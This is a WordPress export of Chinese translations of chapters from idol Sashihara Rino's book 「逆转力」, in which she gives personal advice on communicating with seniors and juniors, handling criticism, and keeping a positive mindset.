几个方案会在总结之后提出，在这之中一定会放入一个明明白白<strong> [绝对不能实现]</strong> 的企划。这样做之后经常会得到表扬 <strong>[真不容易能想出这样的方案]</strong> 。同时也会被认为很有干劲。
再说，<strong>[绝对不能实现]</strong> 的企划会很引人注目，那么可以营造一个氛围，其他企划是不是能够实现呢。真正想要实行的企划混杂在其中。这样做之后大抵都会中计。
如果发表本命企划后，被评价为 <strong>[但是呢，这个不可能实现的哦]</strong>。
<strong>[这样啊，请让我在思考思考]</strong> 马上让步退下足以。
不要在当场继续纠缠<strong> [请等一下。不是这样的，我认为可以实现]</strong>，而是说<strong> [确实还没能考虑到那么深入]</strong>，把对方捧起来，这样做的话会让对方实实在在的感觉到比我高明。<strong>[果然还是我更伟大]</strong>，让对方这样想。
如果在这个问题上纠缠下去，<strong>[我感觉这个企划不错啊] [不对，我是这样这样想的，请放心]</strong>。
如果在当场继续执着于解释说明，也许会有人给出好的评价，但我认为不这么想的人会占到多数。
最好不要被对方认为是 <strong>[这家伙，敢反驳我了么]</strong> 。以后在想提出建议就变的困难了。
而是要稍微过些时间之后再将完善后的方案提出，<strong>[之前的企划有好好考虑修改过......]</strong> 嗯嗯，这样就可以通过了！
<strong>不要移开你的目光</strong>
在与人面对面交流的基础之上，有一个简单高效的技巧。
和人说话的时候，看着对方的眼睛。
这样子会疲倦的哟。说话时看着对方的眼睛，对体力精力都是一种考验，但是，这样做是绝对有利的。
在主演电影《蔷薇色のブー子》中，我与摇滚歌手内田裕也共同演唱了电影的主题歌。
在得到与裕也先生谈话机会的时候，虽然完全没有决定好将要聊什么话题，只是决定<strong> [绝对不要移开自己的目光]</strong>。之后一心聆听裕也先生的话语，<strong>[嗯！嗯！嗯！]</strong> 一边看着他的眼睛一边轻轻点头。一边看着他的眼睛，一点一点的也表达出了自己的意见。
完全被喜欢上了，称呼我<strong> [莉乃]</strong> 的也只有亲人和裕也先生。
在这几年间，最最感觉在心绪上必须不能输给对方的是林真理子小姐。因为，她是讲谈社现代新书《野心のすすめ》的作者哦。见识过非常多形形色色的女人。在得到杂志对谈机会的时候，见面的一瞬间我就决定一秒都不会移开我的目光。这是存在的哦，一瞬间就被对方所看透！
秋元先生同样。能够一瞬间看穿弱点并抓住它，所以绝不能输在目光之上。
<strong>态度为重</strong>
道歉的时候同样不要移开自己的目光。
对方将要生气的时候，一直看着他的眼睛。
<strong>[非常抱歉]</strong> 一边看着对方一边表达歉意。
移籍到HKT48之后，身为前辈，有时候不得不对后辈发火。
有些是生气之后自己切身意识到的东西。
传达注意点的时候，有的孩子一直低着头一副屈服的姿态，其实这样的表现也很正常纯粹，但是我会在意她有没有听我说话啊。
认真听我说话表现出这种“态度”的孩子，想必头脑更冷静。
看着我同时表现出一副知错就改的态度，虽然也有可能心不在焉，但在生气的一方会切实的感觉到<strong> [那个孩子在认真听我说话呢]</strong>，会得到一个好的印象。
一边想着自己在对方眼中的印象，一边与对方交流。我想这样做是有益的。态度很重要。
我是一个只靠态度生存下来的姑娘。
<strong>诉苦的合算方法</strong>
与刚刚的话题有些相似之处，我想诉苦的方法也有许多许多。
首先，把自己心里想的一口气都说出来是不行的。
自己真实的想法说的太过，会牵扯到周围的哦。不仅仅是指偶像与粉丝之间的关系，一般人际关系也是如此。
<strong>[用的着说到这种地步啊]</strong>
<strong>[稍微收敛点哟]</strong>
太过火则会出现像这样的情况不是吗。
受到批评的时候，忍不住心情低沉的时候同样。
忍住想要倾诉的想法，点到即止的吐露一些不会引起别人反感的话语。我想刚刚好的诉苦会得到大家的安慰支援。
这不是谎话哦，说的这些不是说谎，把握火候是最重要的。
<strong>对非常伟大的人坦率，对稍稍伟大的人礼貌</strong>
关于与比自己地位高的人的交流的方法，想说一说我自己的要领。
成为HKT48的剧场支配人之后，与伟大的大叔们交谈的机会渐渐多了起来。综艺节目的现场同样有许多令人钦佩的大叔。
我自认为我善于与大叔们交谈，关于对待方法，面对非常伟大的人以朋友的感觉相待，面对马马虎虎伟大的人要放低自己身段。
比如，我在《笑っていいとも》的节目中，与タモリ先生一起渡过了2年半的时光，节目录像结束后普通的一起吃饭，平常的一起谈天。
非常伟大的人心胸都很宽广。
秋元先生也是如此，像我这样的人寻常去搭话也完全没有问题。比起尊敬模式带来的紧张感，朋友模式会让对方感到有趣。
但是，对马马虎虎伟大的人，稍微失礼便会生气。对稍稍失礼都很敏感呢。
所以尽量放低自己的姿态。做错了什么就糟糕了。
之所以自己善于和大叔交谈，我想得益于很久以前在演唱会会场中经常与ハロプロ粉的大叔们交谈吧。
偶像卡片渐渐流行之时，无论如何也想用自己已经有的去和大叔们交换龟井绘里酱的卡片。只能用尽全力去和大叔们进行交涉。
毫不怕生的小孩子意外的被大叔们理解，与喜爱ハロプロ的大叔们交谈之后发现，大家无一例外都非常和蔼。
多亏2CH，多亏和ハロプロ粉的大叔们交换卡片，才得以能够与タモリ先生，秋元先生普通的对话。
无论什么样的经历都可以在自己这里提升，真是很匪夷所思呐。
<strong>听取别人烦恼的时候，只听不说</strong>
移籍HKT48作为莫大的契机，自己开始思考与人交流的问题。
与在AKB48时期最大的不同是，全体成员都成为了我的后辈。所以渐渐的开始接受来自后辈的烦恼咨询。
我在HKT48中年龄最大，果然经验更加丰富。
<strong>[我在遇到这种情况的时候是这样想的哦]</strong> 能够回答的问题总之尽量回答。
但是，只是说<strong> [我是这样做的] [我是这样想的啊] </strong>，她们的烦恼未必可以得到解决。从根本上说，我的角色应该只是听取对方的倾诉罢了。
单纯的倾听。
我想对方从我的做法中也不一定能找到解决问题的突破点。只是想找一个人倾诉吧。因为我自己在倾诉烦恼的时候也是这样想的。
当然也会有不自觉想要把自己想法强加于人的时候。
爱酱(多田爱佳）由AKB48移籍到HKT48而烦恼的时候，找到我谈心。我忍不住想说<strong> [来这更好哦！]</strong>，因为如果爱酱能够到来，HKT48会变得更欢乐，而且能够看到比我资历更长的爱酱的处事方法，成员们也能够成长。
但是还是忍住了。因为聊到在AKB48的成长烦恼，我点到即止回答说<strong> [在HKT48转换心情，好好努力我想你是可以的哦]</strong> 。
如果因为我的话语而做了决定，那不是爱酱自己的真实想法。
如果发生了意料之外的事故，也许会考虑到<strong> [如果不来HKT48就好了，本来也不是自己的意愿而决定的]</strong> 这种地步了。
如果是根据自己想法而做的决定，我想就不会质疑自己最初的选择。这样才能够直面面前的危机，能够保持向前的姿态。
果然，最重要的是不要说的过多。分寸拿捏在这里同样非常重要。无论什么事情，感情用事容易吃亏。
最近，除了烦恼之外从成员那里收到了好多无关紧要的邮件。
适当的无视掉了。是不是很冷血呢？
<strong>不要轻率放下身段</strong>
稍微补充现在的话题。
在刚刚移籍到HKT48的时候，我对成员说<strong> [对我用口语就可以哦] [叫我さっしー就好]</strong>。我想多亏这样我们很快就成为好朋友，可以平等的谈天。
但是，为了组合可以做好，我也有我的立场。作为前辈的立场不能崩坏。
我决定自己绝不会表现出谄媚后辈的态度。
具体而言，对于不会主动和我搭话的孩子，我也绝不会顾及她们的心情特意去找她们聊天。
迎合她们的话题，进入她们的话题，这些事情也不会去做。
不然她们会自恋的认为是<strong> [是我们让你进来的哟]</strong>，我想我绝对会被轻视。
轻率的放下身段，不会有什么好的事情。多亏最初自己决定了自己的态度，至今她们也不会轻视我。
因为我感觉与成员之间的关系过度美好也不是一件好的事情，所以刻意保持着一定的距离。
说到底，我想以前辈的姿态存在着。
以不被轻视的姿态存在，对于HKT48绝对是好的一面。
正因为平常好好的保持着前后辈之间的关系，所以在公演或演唱会的时候，翻转这种关系的时候才会感觉到有趣。
<strong>以身作则</strong>
不得不对HKT48的后辈发火的时候，我有我自己在意的事情。
自己都做不到反而发火的时候，只会让对方认为<strong> [明明你自己都做不到]</strong>。
为了能够表达自己的愤怒，自己平时就必须做出榜样。
因为我还有其他的工作，与其他成员相比练习时间要少。为了弥补缺少的时间，我会在能够出席的日子中早早来到练习地点，闲暇的时间也会尽量安排能够完成的练习。为了不拖大家后腿而努力加油。
因为大家心里明明白白，我能够好好去做每件事情。所以在我生气的时候，没有反驳的话语只有静静的聆听。
但是，我也会注意选择使用容易让大家接受的话语去说。
经常会说<strong> [虽然我也]</strong> 哦。
<strong>[虽然我也做不到，但大家一起加油]</strong>。
用这样的说话方式，我想变为一种平等的姿态，可以激励大家一起解决问题。
这样做的话，不是更能坦率的接受我的意见吗。
这是我最近编织出的方法。
不要让多余的事占据自己
接下来，关于矛盾。
HKT48是一个团体，而且都是女孩子。
长时间一直在一起，成员之间产生一些危险情绪也是在所难免吧。传言一步步扩散，误解叠加着误解，渐渐成为了争吵也时有发生。
如果这个时候有当事者找到我谈心，那么我会做出干预，如果没有那么我不会插手。
没有道理的干涉她们，我想故事本质会发生变化。
比如，我随口说的话会被擅自解释而成为<strong> [指原好像是这样认为的哦]</strong>。也许我并没有这样认为的事情也会被谁传播。反而麻烦。
一起来设想一个最坏的案例吧。
在HKT48，有一个叫做“奈子美久”的组合。由第三期选拔合格的小学六年级生矢吹奈子和田中美久组成。
两个人都是天使一般。
或者说，妖精。
虽然没有可能，但设定两个人的关系出现了裂痕。
如果介入之中说<strong> [听说你们吵架了？]</strong> 首先不是会被反问到<strong> [你听谁说的？]</strong> 。
如果不小心说出是谁告诉了我，不仅这个孩子和两个人之间的关系会变坏，告密孩子这边毫于疑问也会 <strong>[因为相信指原我才安心告诉你的]</strong> 而追究我。最糟糕了。
其实谁和谁争吵的事情不要去听最好。
如果好似要听到了这些传言，离开或者带上耳机认真的听会音乐。
如果知道了，难免会产生 <strong>[支持哪一边呢？]</strong> 的感情。如果不知道的话我想会好的多。不知道也就无须烦恼。
我也想去多管闲事呢，但是忍住。
不要让多余的事占据自己。
如果本人来找我谈心，多余的事情就变得不再多余，等待那个时候就好。
<strong>[借]了前辈的东西传给后辈</strong>
最后，稍微提些陈年旧事可以吗？
我想知道人很多，48G选拔合格之后，并不能够马上成为正式成员，而是从研究生开始。
研究生的基本任务是正式成员的替身（在其请假时代替出演）。
我研究生的时代，是Team Aともちんさん（板野友美），Team K梅酱（梅田彩佳），Team Bはー酱（片山阳加）的替身。全员的舞蹈动作歌曲都拼命的记住了。
有一天，ともちんさん因为别的工作不能参加公演。这次不是作为伴舞，而是第一次获得了完整演出的机会。拿社团活动距离来说，如同前辈的正式组合中突然混入了一个一年级的小毛孩一般。
因为紧张过度，演出前在后台呼吸变得急促。遇到这种状态还是第一次，超级的恐慌。
这个时候たかみなさん（高桥南）来找我说话了哦。
<strong>[没关系吗，加油哦]</strong>
研究生和前辈之间几乎没有交集，这是我和たかみなさん的第一次对话。对于前辈对我的关心，感到开心。
虽然只是一个招呼，我已经能稳定自己的心情。
从成为她们替身的前辈那里，得到了关于舞蹈呀队形呀手把手的教学。多亏这些经历，让唱歌，舞蹈都不拿手的我，可以获得在大家面前演出的实力。
多亏了前辈的帮助，让我能够成长。
偶尔有人说起我<strong> [对后辈温柔]</strong>。这大概是我在研究生时代从前辈那里体会到的快乐往事，继续传达给后辈罢了。
并不是有意为之，我想只是 <strong>[借]</strong> 了前辈的东西传给了后辈。
只是这样而已。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>865</wp:post_id>
		<wp:post_date><![CDATA[2016-02-03 23:32:36]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-03 15:32:36]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e5%85%ad%e7%ab%a0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e4%b9%a6%e7%b1%8d"><![CDATA[书籍]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e9%80%86%e8%bd%ac%e5%8a%9b"><![CDATA[逆转力]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[232]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>「逆转力」– 指原莉乃著 – 第七章</title>
		<link>https://www.nervgeek.com/2016/02/03/%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e4%b8%83%e7%ab%a0/</link>
		<pubDate>Wed, 03 Feb 2016 15:35:26 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=868</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 24pt;">第七章    排斥也能变为力量——指原流工作术</span></strong>
&nbsp;
偶像的工作，是踏实的努力堆积而成的。
记住歌曲舞蹈，与Team成员一起练习，在粉丝的面前展示成果。
如今的偶像不只是看外在，而是要看到角色，MC的功力也不得不去磨练。
自己书写文章，必须勤勤恳恳的更新博客，推特。其他要做的事情也有许多许多，是个苦差事。
个人作为艺人也有相应的工作，作为HKT48的剧场支配人也做着演唱会歌曲编排想法企划的相关事务。
技术当然重要，自身维持动力的方法同样重要。在这一章，我想聊一聊我自身对于工作的想法。
被说坏话也是工作的一部分我想被责难也是工作。
追随的反义词是排斥，排斥我的人也有许多。<!--more-->
在偶像组合中，绝对需要一个扮演坏角色的人。有一个可以让大家一起说坏话的对象，话题也会热闹起来，如果没有像这样一个角色，也许想找一个话题都找不到了。
我也是在大分作偶像宅的时候，在2CH上发帖倾诉 [如果推这个孩子一定不行啊，运营！]。
试着回想起那个时候自己的情感，我感觉我的情绪并不像文字这样强烈呐。我想我是为了表现我喜欢的成员而作的话题。[比起那个孩子，我更喜欢这个]。
这样想的话，对自己的坏话同样，感情并不像文字这样强烈所以完全没有关系。
就算平时日常生活听到一些坏话，我也完全不会在意。比起 [喜欢] 大人们不是更多把 [讨厌] 挂在嘴边吗。
心里感觉 [喜欢] [好] 的事情往往不会特意拿出来说，而 [讨厌] 却马上吐露出来。
用 [讨厌] 使气氛高涨。
话说我想现在我也成为桥段了呐，我也被认为是个有趣的人呐。
比如我被恶语中伤，就算会有很多很多的人讨厌我。
我也可以做到转换自己的态度 [现实的中我生活幸福这又有什么不好的呢]。
我有支持我的家庭，也有与其说同事不如称朋友的成员，不仅实现了成为偶像的梦想，而且还通过这份工作好好的赚钱。
这样想的话，无论何时现在都是最幸福的时光。
我想我这一生，让我去作为一个坏角色也没有问题，48 G中的这个位子，请允许我去担当！
没有话题才是最恐怖的
说起来讲坏话这件事情，不正是因为自己在意才会去说的么。是不是乐观过头了呐？但是根本不在意的话，就连坏话也不会讲呢。转了一圈讨厌和喜欢是不是一回事呢。
举个例子，漫画家小林よしのり先生。
[我讨厌指原]。
我有一段时间被よしりん（小林よしのり）先生这样说 。
书写这段话的博客通过网络扩散开来，最后也传到了我的耳朵里。
幸运，
那时我这样想。
电视，广播一个劲的说我被よしりん讨厌的话题之后，よしりん更讨厌我了，这场对决构图得到了强化。有知名度的人公开说[讨厌我]之后，喜欢我的人会叫板 [那家伙说什么！]，而排斥我的人会赞同 [就是这样，就是这样！]
如此一来气氛不就热闹起来了吗。
在反驳[讨厌] 我的人意见的过程中，[喜欢]我的人情绪也燃烧起来。话说偶像，我认为要有喜欢她的人和讨厌她的人两者兼备才能让人情绪高涨。在拥有赞否两者论调的同时，人气也会膨胀起来。
没有话题才是最最可怕的事情。因为燃料渐渐消耗殆尽火会熄灭舆论会平息，在舆论平息之前无论是 [喜欢] 还是 [讨厌] 两面都可以，总之找到能成为话题的燃料自己投下去。
就算这样会在短时间内收到大量意见乃至反对的声音，我也有自信可以掌控其中。说到自信的源泉那是我小的时候，一心只看2CH的经历让我善于把握火候。
顺便说，之后我有得到与よしりん谈话的机会，我们握手言和了。
[请你在此之后也作为我NO.1的反对者]
[支持你，作为反对者哦] 其实他是个很好的人。
冲动禁止
在短时间内站在舆论的风口浪尖是好事也是坏事。坏事大抵是一下子被外界情绪所煽动，冲动的写下自己评论马上发布的而引起的。
在写推特，呀谷歌+(Google+)，博客时最重要的事情是趋势和时机。这些比书写的内容要重要的多。禁止冲动。
把心里想的马上说出来只会带来争吵，首先要把感情抑制下去，使劲儿忍耐，然后思考怎么做能让自己获得最大利益之后再书写。剩下的就是趋势和时机。
我的人生充满了忍耐。但是，偶尔也会应战。
在推特上给我奇怪留言的人我全部都看到了。如果有帖子让我感觉到这到底要怎样啊，我会大致的确认这个人其他的帖子，以及个人简介。如果是我认为说了也没关系的人物，我会这样回复 [像这样说我的话，我也会受伤]。
我最不想搭理的是，特意的使用[W]，偏离论点的人。对于这类人我想无论说什么也不会改变的。完全无视掉。
平息的诀窍是、不要让奇怪的情绪高涨。只要自己不再旧事重提，自然而然就会平息。
不被所有人喜欢是理所当然
就是这样的我，在最初的时候面对反对者时自然也不是那么强。
研究生的时代开始，几乎每天都会浏览2CH。无论哪的谁谁稍微的说些坏话都会影响到我，也有好多天都闷闷不乐的时候。特别是开始写微博之后，面对关于自己文章的坏评价没有办法不去在意。
就在那个时候，我移籍到了Team A。(2010年7月）通过这次移籍，使我的内心确确实实变得强大。
阿酱(前田敦子），ともちんさん（板野友美），たかみなさん（高桥みなみ），麻里子大人（篠田麻里子），こじはるさん（小嶋陽菜）.......。初期开始支撑着AKB48，并拉上了人气组合的高度。超选拔的前辈们都在Team A聚集。就算从艺人的观点来看，大家也都是专业艺人。
从那时开始变得有名气，变得可以让更多的人看到。那时候给我好评价的人增加的同时，给我类似坏话的恶评也不断增加。从某种意义上说，被讨厌也是理所当然的事情。如果针对这些都要一一去应对的话，身体精神都维持不住。
所以说前辈们大概都不去看网络的评论，就算看到了也不会挂在心上。内心非常强大。
所以，无论我被谁讨厌都不会因此消沉，坚持自己的方式就好。能有这种想法的契机，我想是移籍来到了
Team A。
在《笑っていいとも》中学到了享乐姿态
回过身看走过的路，在与人相遇经历的堆积中，我感觉我的思考方式也在一点一点的改变。在自己工作进行之中，最重要的相遇是《笑っていいとも》的タモリ先生。
2011年10月开始到最终回（2014年3月31日）结束，我在《いいとも！》中得到机会正式出演的。
我得以与更多的艺人接触，并且每周同一时间在电视上播出，能够了解我的人也越来越多。 [在电视节目中好好努力我也许能行] 心情也变得非常积极起来。
过去为了能在每一个出演的节目中留下自己的痕迹而发奋努力哟。正因为这样而紧张，焦虑，最终反而一场空。
在节目《さしこのくせに～この番組AKBと全く関係ありません～》（2010年1月~9月/ TBS,大分放送）中与土田晃之先生一起共事。他提醒我说 [失礼并不是有趣的事情] 。而我在节目中总是哭泣。
就是这样的我却可以在《いいとも！》的最初回就可以放轻松并享乐其中，也许是我自己多少有些成长，但我想最大的原因是因为タモリ先生给人的感觉。
タモリ先生总是那样从容，就算是一瞬间的焦虑也没有看到过。
我感觉多亏了タモリ先生的这份从容，周围大家的焦虑感也随之消失。
如同过去的我 [一定要留下成果] [一定要一发命中] 这样的人在《いいとも！》中一个也没有哦。
也没有喊叫 [我来，我来] 像这样显眼，把周围气氛弄的奇怪的人。
我的想法也得到改变，融入现场之中去享受就好了。本来就是在工作中不会紧张的类型，心情完全舒畅。不去比较自己与别人做得到与做不到的东西也挺好的，不去竞争也挺好的，只是享乐其中就足够了。对于自己原本就持有的思考方式，现在变得更加自信了。
不惧怕失败
说些奇怪的话题可以吗。
也许我，本来是乐观的性格哟。
很久以前，我就可以心平气和的放心使用别人的电脑，就算画面变成单一的蓝色，就算开始出现奇怪的声音，我也有自信绝对不会弄坏它。我感觉绝不会因为我玩了一会就坏掉，就像感觉自己绝对不会遇上事故一样。难以置信的灾祸绝不会降临到自己头上。
所以直到今天的人生中，真心认为危机的事情一次也没有过。稍稍感觉到这次的事情也许有些糟糕，也不过是周刊刊登关于我的记事。
所以，我不惧怕失败，就算失败了，我也有自信不会发展成惊人的事情。没有年老后的不安。不希望死去。就算生命只能延长一天也想好好生活。
就算真的有失败的地方，我也会很快的忘却。
感觉因为自己的错误而失败的话，那个时间点自然会失落，但是很快就可以忘记，只需要一个小时。
我不会沉溺于过去，我的立场是一直向前冲。
站在大舞台也不会紧张的秘诀
因为我是不会拘泥于过去的类型，所以我也很少去确认自己已经完成的工作。
只是，我想还是看一看会更好，特别是自己担任MC的节目，最开始的几期我一定会好好的观看。节目放送采用怎样的方式，怎么进行编辑，确认了这些之后，也明白了自己能给节目带来什么。
......但是，果然自己出演的电视基本没有看呢。
正因为这样吧，我没有感觉自己是一位电视节目艺人。
很罕见出现 [我是艺人啊！] 的想法，那是在涉谷109大厦看到自己大幅海报的时候。（2011年6月，DVD 宣传海报《AKBがいっぱい～ザ ベスト ミュージックビデオ～》）。
从小孩子的时候看漫画开始，说到东京，就会想到涉谷109。在自己孩童时代就熟知的场所中悬挂自己的大幅海报，很感动，不假思索去拍摄彩信照片。
与这同样开心的事情是，刚刚说过的在《笑っていいとも！》中正式出演。因为我一直以来都很少看电视，所以知道的节目少之又少哦。但是，《笑っていいとも！》我却是知道的。因为我知道这个节目，所以也想去演出。正巧在这时候有这样一个演出的机会自然很开心。
可以出演《いいとも！》而开心的理由，最初是因为可以进入新宿的スタジオアルタ（译者注：位于新宿的多用途艺术工作室）中一看究竟。比如在电视看起来很大意料之外却很小等等，想去了解自己不知道的内情。对自己知道的东西是怎么被制作出来同样感兴趣。说白了就是脑残粉吧。
如果这样看看也不错，看过就能够了解了，我是抱着这样的情感呢。也许看看就挺好的，我想我在某一方面，是抱着观众的心态去演出节目。
也许正是这样我才不会紧张呢。开心的观看就好啦，我在心里某处这样想着。最近作为观众的心情慢慢强烈。我能够做到什么不去在意，只要开开心心的去做就好了。
能够这样思考之后，不可思议的感觉自己可以很好的玩转现场。保持着 [享乐] 的游戏心理，说是意外也好却是最棒的。我想这也许不就是工作中最重要的心态么。
真心能够信任的人，放心去信任吧关于工作，最近有一件在意的事情。
真心能够信任的人，那么放心去相信就好，
AKB48选拔合格的时候，我拜托秋元先生帮我做策划，完全听从的姿态。
所以按照秋元先生所说的去做就好，就算不能好好的前进，是自己决定让别人帮助策划，那么常理来说要让他照顾你到最后。
如果一边想着 [为什么让我做这些呢] 一边工作，这样的状态不是不行吗。这样完全不会开心的。
没有必要特意去质疑。总之接受安排，关于这件事只需要思考自己能完成多少就好。
最近我产生想要报恩的想法。
我能够有今天，都多亏有秋元先生。选拔的时候拉着我向上的是秋元先生，给我移籍HKT48机会的同样是秋元先生。
秋元先生创造的48 G绝对不能被淘汰，我必须让48 G繁荣壮大，我怀抱着这些想法而生活。
对真心信任的人报答对我的恩惠，是我工作最大的动力。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>868</wp:post_id>
		<wp:post_date><![CDATA[2016-02-03 23:35:26]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-03 15:35:26]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e4%b8%83%e7%ab%a0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e4%b9%a6%e7%b1%8d"><![CDATA[书籍]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e9%80%86%e8%bd%ac%e5%8a%9b"><![CDATA[逆转力]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[277]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>「逆转力」– 指原莉乃著 – 第八章</title>
		<link>https://www.nervgeek.com/2016/02/03/%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e5%85%ab%e7%ab%a0/</link>
		<pubDate>Wed, 03 Feb 2016 15:36:35 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=870</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 24pt;">第八章    用“转换”与“确信”完成逆转——指原流思考术</span></strong>
&nbsp;
茫然自失从未有过。
我不喜欢夜晚在店里喝了很多酒之后放任的感觉。在我的人生中从未去过酒吧。夜总会什么的最可怕了。
意外的很多次被说到 [真正经啊] 。其实不是哦，就算是只有1秒，我也不想迷失我自己。
就算有艰辛的事情，能够睡一晚就都忘记了。
就算是 [话说为什么还能睡的着？] 这样的状况，我也可以。进入AKB48时至今日，因为不安而难眠的夜晚从未有过。
心里想没有关系，那么就没有问题。重要的是转换心情，重要的是确信自己。
也许仅仅是我生来具有的性格，正是这样的我，有很多正在思考的事情。为了能够启动“逆转力”，我想说一说关于创造强大心境的故事。<!--more-->
无论什么都能转化为积极
成员那里经常这样评价， [さっしー总是积极向上呢]。
好像会发生什么讨厌的事情而不安的时候，也有来自成员的依赖 [只要能和さっしー一起感觉什么都不怕，请让我和你一起]。
我想这些事表现出强大的相信力。
危机我也认为是危机，但是我同时相信这是机遇，我确信。这个想法愈是强烈，心愿便会成真。
变成宗教的感觉了吧......更简洁来说，也许会被这么认为。
无论是什么消极的状况，跟随思考的方式都会变得积极，这是如何思考的话题。今年总选举的是时候，有HKT48的年轻成员找到我谈心。
[速报（投票初日的计算）没能进入前80名，这样下去也许会是圈外而感到不安]。
[总之要相信自己] 我这样回答。
[速报的时候圈外也许是件好事情哦，不仅会激起粉丝们一定要让你入围的心情，速报没能入围而正式开票被叫到名字的话，会成为话题而热闹起来，所以总之现在要相信自己，一定可以入围的哦]。
如果最终依然得到了圈外的结果，那么我想说类似这样的话语 [今年虽是圈外，但明年终于能够入围，作为故事不是更有趣吗？]。
这与我在第四章中提到过的完全相同，[拼尽全力去寻找的话，幸运在哪里都可以寻找的到]。同样，无论如何消极，跟随你的思考方式都可以转化成积极的力量。
大声说[喜欢]
我想积极的事情不断的说出来最好。虽然不知道与工作能有什么关联。多亏有人记得我[喜欢]的，我[开心] 的，梦想成真的事情并不少见。
比如，我非常喜欢浅野いにお先生的漫画。在很多地方都表达过自己的喜爱之后在杂志得到了面对面谈话的机会。
而且并不只是如此，在决定移籍HKT48之后，浅野先生为了给我鼓劲，画了我的画像并作为礼物赠与我。
